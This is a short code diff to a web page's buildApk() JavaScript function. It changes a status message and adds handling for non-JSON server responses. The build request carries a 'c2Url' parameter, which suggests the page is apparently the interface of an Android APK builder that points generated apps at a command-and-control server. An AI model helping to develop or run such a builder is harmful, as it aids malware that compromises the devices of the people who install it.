@@ -33,7 +33,7 @@ function buildApk() {
     buildBtn.disabled = true;
     buildBtn.textContent = 'Building...';
     statusDiv.style.display = 'block';
-    statusMsg.textContent = 'Building APK, please wait... This may take a minute.';
+    statusMsg.textContent = 'Building APK, please wait... This may take a minute or more on first run.';
     statusMsg.style.color = '#333';
     downloadDiv.style.display = 'none';
     buildLog.textContent = '';
@@ -49,7 +49,15 @@ function buildApk() {
             c2Url: c2Url
         })
     })
-    .then(response => response.json())
+    .then(async response => {
+        const text = await response.text();
+        try {
+            return JSON.parse(text);
+        } catch (e) {
+            console.error('Server response was not JSON:', text);
+            throw new Error('Server returned an invalid response (not JSON). Check the console or logs.');
+        }
+    })
     .then(data => {
         buildBtn.disabled = false;
         buildBtn.textContent = 'Build APK';
